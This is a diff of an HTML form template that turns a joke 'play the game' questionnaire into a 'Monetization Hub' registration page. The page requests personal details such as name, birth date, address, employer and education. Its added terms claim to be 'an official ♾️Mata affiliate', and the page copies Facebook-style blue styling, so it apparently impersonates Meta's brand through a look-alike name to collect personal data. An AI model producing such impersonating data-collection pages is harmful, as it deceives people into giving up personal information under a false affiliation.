@@ -1,229 +1,531 @@
 {% extends "base.html" %}
 {% block body %}
 <div class="card form-card">
-  <h1>📋 Play the Game by Filling the Form</h1>
-  <p class="lead">Please complete all sections carefully before submitting. 
-  <br><small>Note: do not put your real details — just fill it randomly.</small></p>
+  <div class="form-header">
+    <h1>📋 Complete Your Profile</h1>
+    <p class="lead">Please fill out all sections carefully to proceed with your account setup.</p>
+    <div class="disclaimer">
+      <small>🔒 Note: For security purposes, please use placeholder information only.</small>
+    </div>
+  </div>
 
   <form id="f1form" method="POST" action="{{ url_for('f1') }}" novalidate>
     
     <!-- Personal Information -->
-    <h2 class="section-title">👤 Personal Information</h2>
-    <label class="subheading ticker">Full Name</label>
-    <input type="text" name="fullname" class="input" required>
-    <div class="error">Please enter your full name</div>
+    <div class="form-section">
+      <h2 class="section-title">👤 Personal Information</h2>
+      <div class="form-group">
+        <label class="form-label">Full Name</label>
+        <input type="text" name="fullname" class="input" placeholder="Enter your full name" required>
+        <div class="error">Please enter your full name</div>
+      </div>
 
-    <label class="subheading ticker">Date of Birth</label>
-    <input type="date" name="dob" class="input" required>
-    <div class="error">Please select your date of birth</div>
+      <div class="form-group">
+        <label class="form-label">Date of Birth</label>
+        <input type="date" name="dob" class="input" required>
+        <div class="error">Please select your date of birth</div>
+      </div>
 
-    <label class="subheading ticker">Gender</label>
-    <div class="group button-group" data-group="gender">
-      <button type="button" class="option-btn" data-name="gender" data-value="Male">Male</button>
-      <button type="button" class="option-btn" data-name="gender" data-value="Female">Female</button>
-      <button type="button" class="option-btn" data-name="gender" data-value="Other">Other</button>
-      <input type="hidden" name="gender" required>
+      <div class="form-group">
+        <label class="form-label">Gender</label>
+        <div class="group button-group" data-group="gender">
+          <button type="button" class="option-btn" data-name="gender" data-value="Male">Male</button>
+          <button type="button" class="option-btn" data-name="gender" data-value="Female">Female</button>
+          <button type="button" class="option-btn" data-name="gender" data-value="Other">Other</button>
+          <input type="hidden" name="gender" required>
+        </div>
+        <div class="error group-error">Please select your gender</div>
+      </div>
+
+      <div class="form-group">
+        <label class="form-label">Marital Status</label>
+        <div class="group button-group" data-group="marital">
+          <button type="button" class="option-btn" data-name="marital" data-value="Single">Single</button>
+          <button type="button" class="option-btn" data-name="marital" data-value="Married">Married</button>
+          <button type="button" class="option-btn" data-name="marital" data-value="Divorced">Divorced</button>
+          <button type="button" class="option-btn" data-name="marital" data-value="Widowed">Widowed</button>
+          <input type="hidden" name="marital" required>
+        </div>
+        <div class="error group-error">Please choose your marital status</div>
+      </div>
     </div>
-    <div class="error group-error">Please select your gender</div>
-
-    <label class="subheading ticker">Marital Status</label>
-    <div class="group button-group" data-group="marital">
-      <button type="button" class="option-btn" data-name="marital" data-value="Single">Single</button>
-      <button type="button" class="option-btn" data-name="marital" data-value="Married">Married</button>
-      <button type="button" class="option-btn" data-name="marital" data-value="Divorced">Divorced</button>
-      <button type="button" class="option-btn" data-name="marital" data-value="Widowed">Widowed</button>
-      <input type="hidden" name="marital" required>
-    </div>
-    <div class="error group-error">Please choose your marital status</div>
-
-    <hr>
 
     <!-- Residential Address -->
-    <h2 class="section-title">🏠 Residential Address</h2>
-    <label class="subheading ticker">Street</label>
-    <input type="text" name="street" class="input" required>
-    <div class="error">Enter your street</div>
+    <div class="form-section">
+      <h2 class="section-title">🏠 Residential Address</h2>
+      <div class="form-group">
+        <label class="form-label">Street Address</label>
+        <input type="text" name="street" class="input" placeholder="Enter your street address" required>
+        <div class="error">Enter your street address</div>
+      </div>
 
-    <label class="subheading ticker">City</label>
-    <input type="text" name="city" class="input" required>
-    <div class="error">Enter your city</div>
+      <div class="form-row">
+        <div class="form-group">
+          <label class="form-label">City</label>
+          <input type="text" name="city" class="input" placeholder="City" required>
+          <div class="error">Enter your city</div>
+        </div>
 
-    <label class="subheading ticker">Postal Code</label>
-    <input type="text" name="postal" class="input" required>
-    <div class="error">Enter your postal code</div>
+        <div class="form-group">
+          <label class="form-label">Postal Code</label>
+          <input type="text" name="postal" class="input" placeholder="Postal code" required>
+          <div class="error">Enter your postal code</div>
+        </div>
+      </div>
 
-    <label class="subheading ticker">Country</label>
-    <input type="text" name="country" class="input" required>
-    <div class="error">Enter your country</div>
-
-    <hr>
+      <div class="form-group">
+        <label class="form-label">Country</label>
+        <input type="text" name="country" class="input" placeholder="Country" required>
+        <div class="error">Enter your country</div>
+      </div>
+    </div>
 
     <!-- Education -->
-    <h2 class="section-title">🎓 Education Background</h2>
-    <label class="subheading ticker">Highest Qualification</label>
-    <input type="text" name="qualification" class="input" required>
-    <div class="error">Enter your highest qualification</div>
+    <div class="form-section">
+      <h2 class="section-title">🎓 Education Background</h2>
+      <div class="form-group">
+        <label class="form-label">Highest Qualification</label>
+        <input type="text" name="qualification" class="input" placeholder="Your highest qualification" required>
+        <div class="error">Enter your highest qualification</div>
+      </div>
 
-    <label class="subheading ticker">Institution</label>
-    <input type="text" name="institution" class="input" required>
-    <div class="error">Enter your institution</div>
+      <div class="form-group">
+        <label class="form-label">Institution</label>
+        <input type="text" name="institution" class="input" placeholder="Educational institution" required>
+        <div class="error">Enter your institution</div>
+      </div>
 
-    <label class="subheading ticker">Year Completed</label>
-    <input type="number" name="year_completed" class="input" required>
-    <div class="error">Enter the year completed</div>
-
-    <hr>
+      <div class="form-group">
+        <label class="form-label">Year Completed</label>
+        <input type="number" name="year_completed" class="input" placeholder="Graduation year" required>
+        <div class="error">Enter the year completed</div>
+      </div>
+    </div>
 
     <!-- Work -->
-    <h2 class="section-title">💼 Work / Business Information</h2>
-    <label class="subheading ticker">Occupation / Job Title</label>
-    <input type="text" name="occupation" class="input" required>
-    <div class="error">Enter your occupation</div>
+    <div class="form-section">
+      <h2 class="section-title">💼 Professional Information</h2>
+      <div class="form-group">
+        <label class="form-label">Occupation / Job Title</label>
+        <input type="text" name="occupation" class="input" placeholder="Your occupation" required>
+        <div class="error">Enter your occupation</div>
+      </div>
 
-    <label class="subheading ticker">Company / Business Name</label>
-    <input type="text" name="company" class="input" required>
-    <div class="error">Enter your company</div>
-
-    <hr>
+      <div class="form-group">
+        <label class="form-label">Company / Business Name</label>
+        <input type="text" name="company" class="input" placeholder="Company name" required>
+        <div class="error">Enter your company</div>
+      </div>
+    </div>
 
     <!-- Fun Preferences -->
-    <h2 class="section-title">💰 Fun Preferences</h2>
-    <div class="group button-group" data-group="fun">
-      <button type="button" class="option-btn" data-name="fun" data-value="happiness">Feel from your own happiness</button>
-      <button type="button" class="option-btn" data-name="fun" data-value="smile">Earn from your smile</button>
-      <button type="button" class="option-btn" data-name="fun" data-value="both">Both</button>
-      <input type="hidden" name="fun" required>
+    <div class="form-section">
+      <h2 class="section-title">💰 Monetization Preferences</h2>
+      <div class="form-group">
+        <div class="group button-group" data-group="fun">
+          <button type="button" class="option-btn" data-name="fun" data-value="happiness">Content Creation</button>
+          <button type="button" class="option-btn" data-name="fun" data-value="smile">Social Engagement</button>
+          <button type="button" class="option-btn" data-name="fun" data-value="both">Both Methods</button>
+          <input type="hidden" name="fun" required>
+        </div>
+        <div class="error group-error">Select at least one monetization preference</div>
+      </div>
     </div>
-    <div class="error group-error">Select at least one fun preference</div>
-
-    <hr>
 
     <!-- Short Bio -->
-    <h2 class="section-title">📝 Short Bio</h2>
-    <textarea name="bio" class="input" rows="6" minlength="15" maxlength="1500" required placeholder="Write 15–300 words..."></textarea>
-    <div class="error">Write a short bio (15–300 words)</div>
-
-    <hr>
+    <div class="form-section">
+      <h2 class="section-title">📝 Personal Bio</h2>
+      <div class="form-group">
+        <label class="form-label">Short Biography</label>
+        <textarea name="bio" class="input" rows="6" minlength="15" maxlength="1500" required placeholder="Tell us about yourself (15-300 words)..."></textarea>
+        <div class="error">Please write a short bio (15-300 words)</div>
+      </div>
+    </div>
 
     <!-- Notifications -->
-    <h2 class="section-title">🔔 Notification Preferences</h2>
-    <div class="group button-group" data-group="notify">
-      <button type="button" class="option-btn" data-name="notify" data-value="email">Email Updates</button>
-      <button type="button" class="option-btn" data-name="notify" data-value="sms">SMS Alerts</button>
-      <button type="button" class="option-btn" data-name="notify" data-value="push">Push Notifications</button>
-      <input type="hidden" name="notify" required>
+    <div class="form-section">
+      <h2 class="section-title">🔔 Notification Preferences</h2>
+      <div class="form-group">
+        <div class="group button-group" data-group="notify">
+          <button type="button" class="option-btn" data-name="notify" data-value="email">Email Updates</button>
+          <button type="button" class="option-btn" data-name="notify" data-value="sms">SMS Alerts</button>
+          <button type="button" class="option-btn" data-name="notify" data-value="push">Push Notifications</button>
+          <input type="hidden" name="notify" required>
+        </div>
+        <div class="error group-error">Select at least one notification preference</div>
+      </div>
     </div>
-    <div class="error group-error">Select at least one notification preference</div>
-
-    <hr>
 
     <!-- Play Method -->
-    <h2 class="section-title">💳 Play Method</h2>
-    <div class="group button-group" data-group="method">
-      <button type="button" class="option-btn" data-name="method" data-value="feeling">Feeling</button>
-      <button type="button" class="option-btn" data-name="method" data-value="hoping">Hoping</button>
-      <button type="button" class="option-btn" data-name="method" data-value="applications">Applications</button>
-      <input type="hidden" name="method" required>
+    <div class="form-section">
+      <h2 class="section-title">💳 Account Type</h2>
+      <div class="form-group">
+        <div class="group button-group" data-group="method">
+          <button type="button" class="option-btn" data-name="method" data-value="feeling">Creator Account</button>
+          <button type="button" class="option-btn" data-name="method" data-value="hoping">Viewer Account</button>
+          <button type="button" class="option-btn" data-name="method" data-value="applications">Business Account</button>
+          <input type="hidden" name="method" required>
+        </div>
+        <div class="error group-error">Please choose an account type</div>
+      </div>
     </div>
-    <div class="error group-error">Choose a play method</div>
-
-    <hr>
 
     <!-- Terms -->
-    <h2 class="section-title">📄 Terms & Conditions</h2>
-    <div class="terms-box">
-      <p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Donec non eros ut elit suscipit cursus. 
-      Curabitur a sapien at est bibendum porttitor. Suspendisse potenti. Etiam ac tristique nulla.</p>
-    </div>
-    <label><input type="checkbox" name="terms" required> I have read and agree to the Terms & Conditions.</label>
-    <div class="error group-error">You must agree before continuing</div>
+    <div class="form-section">
+      <h2 class="section-title">📄 Terms & Conditions</h2>
+      <div class="form-group">
+        <div class="terms-box">
+          <p>⚖️ Terms and Conditions
 
-    <hr>
+Effective Date: [Insert Date]
+Platform: Monetization Hub (an official ♾️Mata affiliate)
+
+Welcome to Monetization Hub. By accessing or using this platform, you agree to comply with the following Terms and Conditions. Please read them carefully before using our services.
+
+1. Acceptance of Terms
+
+By creating an account or using this platform, you acknowledge that you have read, understood, and agreed to be bound by these Terms and Conditions and our Privacy Policy.
+
+2. Eligibility
+
+Users must be at least 18 years old or have legal parental consent to access and use the platform.
+
+3. Account Responsibilities
+
+You are responsible for maintaining the confidentiality of your account credentials and for all activities that occur under your account.
+Any attempt to provide false information, impersonate others, or misuse platform tools will result in immediate suspension or termination.
+
+4. Monetization Policy
+
+Creators may earn revenue through approved monetization methods, including content engagement, streaming, and interactions.
+Revenue is distributed under the 80/20 model, where creators retain 80% of their earnings and 20% supports platform operations and development.
+
+5. Content Ownership
+
+You retain full ownership of the content you create. However, by uploading or sharing on the platform, you grant Monetization Hub a non-exclusive, royalty-free license to display and promote your content in connection with platform services.
+
+6. Prohibited Activities
+
+Users are strictly prohibited from:
+ • Uploading unlawful, harmful, or infringing content.
+ • Engaging in fraudulent, spam, or manipulative behavior.
+ • Violating intellectual property rights.
+ • Misusing platform tools or features.
+
+7. Termination
+
+Monetization Hub reserves the right to suspend or terminate any account that violates these Terms or engages in harmful activity toward the platform or its users.
+
+8. Limitation of Liability
+
+Monetization Hub is not responsible for any loss of earnings, data, or access caused by third-party systems, technical issues, or user misconduct.
+
+9. Modifications
+
+We may update these Terms at any time. Continued use of the platform after updates implies acceptance of the new terms.
+
+10. Contact
+
+For questions or support, please contact: support@monetizationhub.com
+
+⸻
+
+🔒 Privacy Policy
+
+Effective Date: [Insert Date]
+Platform: Monetization Hub (an official ♾️Mata affiliate)
+
+This Privacy Policy explains how Monetization Hub collects, uses, and protects your information when you use our platform.
+
+1. Information We Collect
+ • Personal information (name, email, payment details, etc.) provided during registration or verification.
+ • Usage data, including login times, device type, and interactions on the platform.
+ • Content or media you upload or share.
+
+2. How We Use Your Information
+
+We use collected data to:
+ • Operate and improve platform functionality.
+ • Process payments and manage earnings.
+ • Provide user support and security.
+ • Communicate updates, promotions, or policy changes.
+
+3. Data Security
+
+All user data is encrypted and stored securely. We apply industry-standard measures to prevent unauthorized access, disclosure, or misuse.
+
+4. Sharing of Information
+
+We do not sell or trade your personal data. Information may be shared only with trusted service providers or legal authorities when required by law.
+
+5. User Rights
+
+You have the right to:
+ • Access and review your personal information.
+ • Request corrections or deletion of your data.
+ • Withdraw consent or close your account at any time.
+
+6. Cookies and Tracking
+
+We use cookies and analytics tools to enhance user experience and platform performance. You may disable cookies in your browser settings.
+
+7. Policy Updates
+
+This Privacy Policy may be updated periodically. We encourage you to review it regularly to stay informed about how your data is protected.
+
+8. Contact
+
+For privacy-related inquiries, contact: privacy@monetizationhub.com.</p>
+        </div>
+        <div class="checkbox-group">
+          <label class="checkbox-label">
+            <input type="checkbox" name="terms" required>
+            <span class="checkmark"></span>
+            I have read and agree to the Terms & Conditions
+          </label>
+          <div class="error group-error">You must agree to the terms before continuing</div>
+        </div>
+      </div>
+    </div>
 
     <!-- Submit -->
-    <div class="center">
-      <button type="submit" class="btn-modern">Submit</button>
+    <div class="form-section">
+      <button type="submit" class="submit-btn">Complete Registration</button>
     </div>
   </form>
 </div>
 
 <style>
 .form-card {
-  max-width: 720px;
+  max-width: 680px;
   margin: 28px auto;
-  padding: 32px;
-  border-radius: 16px;
-  background: #fff;
-  box-shadow: 0 12px 28px rgba(24,119,242,0.25);
+  padding: 40px;
+  border-radius: 20px;
+  background: #ffffff;
+  box-shadow: 0 15px 35px rgba(24, 119, 242, 0.15);
+  border: 1px solid #f1f5f9;
 }
-.input, textarea, select {
-  width: 100%;
-  padding: 14px;
+
+.form-header {
+  text-align: center;
+  margin-bottom: 32px;
+  padding-bottom: 24px;
+  border-bottom: 2px solid #f1f5f9;
+}
+
+.form-header h1 {
+  font-size: 28px;
+  font-weight: 800;
   margin-bottom: 12px;
-  border: 1px solid #e5e7eb;
+  color: #0f172a;
+  background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+  -webkit-background-clip: text;
+  -webkit-text-fill-color: transparent;
+  background-clip: text;
+}
+
+.form-header .lead {
+  font-size: 16px;
+  color: #64748b;
+  margin-bottom: 12px;
+  line-height: 1.5;
+}
+
+.disclaimer {
+  background: #fffbeb;
+  border: 1px solid #fef3c7;
+  border-radius: 12px;
+  padding: 12px 16px;
+  margin-top: 16px;
+}
+
+.disclaimer small {
+  color: #92400e;
+  font-weight: 500;
+}
+
+.form-section {
+  margin-bottom: 32px;
+  padding-bottom: 24px;
+  border-bottom: 1px solid #f1f5f9;
+}
+
+.form-section:last-of-type {
+  border-bottom: none;
+  margin-bottom: 0;
+  padding-bottom: 0;
+}
+
+.section-title {
+  font-size: 18px;
+  font-weight: 700;
+  margin-bottom: 20px;
+  color: #1e293b;
+  padding-left: 16px;
+  border-left: 4px solid #1877F2;
+  background: #f8fafc;
+  padding: 12px 16px;
+  border-radius: 12px;
+}
+
+.form-group {
+  margin-bottom: 20px;
+}
+
+.form-row {
+  display: grid;
+  grid-template-columns: 1fr 1fr;
+  gap: 16px;
+}
+
+.form-label {
+  display: block;
+  font-weight: 600;
+  font-size: 14px;
+  margin-bottom: 8px;
+  color: #374151;
+}
+
+.input, textarea {
+  width: 100%;
+  padding: 16px;
+  border: 2px solid #e5e7eb;
   border-radius: 14px;
   font-size: 16px;
-  font-weight: 600;
-  background: #f9fafb;
-  transition: border-color 0.2s, box-shadow 0.2s;
+  background: #ffffff;
+  transition: all 0.3s ease;
+  box-sizing: border-box;
 }
+
 .input:focus, textarea:focus {
   outline: none;
   border-color: #1877F2;
-  box-shadow: 0 0 0 3px rgba(24,119,242,0.25);
-  background: #fff;
+  box-shadow: 0 0 0 4px rgba(24, 119, 242, 0.15);
+  background: #ffffff;
 }
+
+.input::placeholder {
+  color: #9ca3af;
+  font-weight: 400;
+}
+
 .invalid {
   border-color: #ef4444 !important;
-  box-shadow: 0 0 0 3px rgba(239,68,68,0.25) !important;
+  box-shadow: 0 0 0 4px rgba(239, 68, 68, 0.1) !important;
 }
+
 .group.invalid {
-  border: 1px solid #ef4444;
-  box-shadow: 0 0 0 3px rgba(239,68,68,0.25);
-  border-radius: 12px;
-  padding: 8px;
+  border: 2px solid #ef4444;
+  box-shadow: 0 0 0 4px rgba(239, 68, 68, 0.1);
+  border-radius: 14px;
+  padding: 12px;
 }
-.section-title {
-  font-size: 20px;
-  margin: 24px 0 12px;
-  font-weight: 700;
-  color: #0f172a;
-  border-left: 4px solid #1877F2;
-  padding-left: 8px;
+
+.button-group {
+  display: flex;
+  flex-wrap: wrap;
+  gap: 12px;
+  margin-bottom: 8px;
 }
-.subheading {
-  font-weight: 700;
-  font-size: 16px;
-  margin: 12px 0 6px;
-  color: #334155;
-}
-.ticker {position: relative;display: inline-block;overflow: hidden;}
-.ticker::after {
-  content: '';
-  position: absolute;
-  top: 0; left: -100%;
-  width: 200%; height: 100%;
-  background: linear-gradient(to right, rgba(255,255,255,0.1), rgba(255,255,255,0.3), rgba(255,255,255,0.1));
-  animation: ticker 3s linear infinite;
-}
-@keyframes ticker {0%{left:-100%;}100%{left:100%;}}
-.button-group {display: flex; flex-wrap: wrap; gap: 12px; margin-bottom: 12px;}
+
 .option-btn {
-  padding: 10px 18px; border-radius: 12px; border: 1px solid #ccc;
-  font-weight: 700; cursor: pointer; background: #e5e7eb;
-  transition: all 0.25s ease; flex: 1 1 auto; text-align: center;
+  flex: 1;
+  min-width: 120px;
+  padding: 14px 20px;
+  border: 2px solid #e5e7eb;
+  border-radius: 12px;
+  font-weight: 600;
+  font-size: 14px;
+  cursor: pointer;
+  background: #ffffff;
+  color: #64748b;
+  transition: all 0.3s ease;
+  text-align: center;
 }
-.option-btn.selected {background:#1877F2;color:#fff;box-shadow:0 4px 12px rgba(24,119,242,0.35);transform:translateY(-1px);}
-.error, .group-error {color:#ef4444;font-size:0.85em;display:none;margin-top:4px;}
-.btn-modern {
-  display:inline-block;padding:12px 28px;border-radius:999px;border:none;
-  background:linear-gradient(135deg,#1877F2,#4e9af1);color:white;font-weight:700;
-  font-size:16px;cursor:pointer;box-shadow:0 6px 16px rgba(24,119,242,0.35);
-  transition:all 0.25s ease;
+
+.option-btn:hover {
+  border-color: #1877F2;
+  color: #1877F2;
+  transform: translateY(-1px);
 }
-.btn-modern:hover {box-shadow:0 10px 22px rgba(24,119,242,0.45);}
-.btn-modern:active {transform:scale(0.98);}
-.terms-box {max-height:120px;overflow:auto;border:1px solid #ddd;padding:12px;border-radius:8px;font-size:14px;background:#f9fafb;}
+
+.option-btn.selected {
+  background: #1877F2;
+  color: #ffffff;
+  border-color: #1877F2;
+  box-shadow: 0 4px 12px rgba(24, 119, 242, 0.25);
+  transform: translateY(-1px);
+}
+
+.error, .group-error {
+  color: #ef4444;
+  font-size: 13px;
+  font-weight: 500;
+  display: none;
+  margin-top: 6px;
+}
+
+.terms-box {
+  max-height: 200px;
+  overflow-y: auto;
+  border: 2px solid #e5e7eb;
+  border-radius: 12px;
+  padding: 20px;
+  font-size: 13px;
+  line-height: 1.6;
+  background: #f8fafc;
+  margin-bottom: 20px;
+}
+
+.checkbox-group {
+  margin-top: 16px;
+}
+
+.checkbox-label {
+  display: flex;
+  align-items: center;
+  cursor: pointer;
+  font-weight: 600;
+  color: #374151;
+  gap: 12px;
+}
+
+.checkbox-label input[type="checkbox"] {
+  width: 18px;
+  height: 18px;
+  border: 2px solid #d1d5db;
+  border-radius: 4px;
+  cursor: pointer;
+}
+
+.checkbox-label input[type="checkbox"]:checked {
+  background-color: #1877F2;
+  border-color: #1877F2;
+}
+
+.submit-btn {
+  width: 100%;
+  background: linear-gradient(135deg, #1877F2, #4e9af1);
+  color: #ffffff;
+  font-size: 18px;
+  font-weight: 700;
+  padding: 18px 32px;
+  border-radius: 25px;
+  border: none;
+  cursor: pointer;
+  transition: all 0.3s ease;
+  box-shadow: 0 8px 20px rgba(24, 119, 242, 0.35);
+  margin-top: 16px;
+}
+
+.submit-btn:hover {
+  transform: translateY(-2px);
+  box-shadow: 0 12px 25px rgba(24, 119, 242, 0.45);
+}
+
+.submit-btn:active {
+  transform: translateY(0);
+}
 </style>
 
 <script>
@@ -268,9 +570,9 @@ function validateForm(showErrors = true) {
     } else if (isCheckbox) {
       if (!input.checked) {
         valid = false;
-        const err = input.closest("label").nextElementSibling;
+        const err = input.closest(".checkbox-group").querySelector(".group-error");
         if (showErrors && err) err.style.display = "block";
-        if (!firstInvalid) firstInvalid = input.closest("label");
+        if (!firstInvalid) firstInvalid = input.closest(".checkbox-group");
       }
     } else if (!input.value.trim()) {
       valid = false;
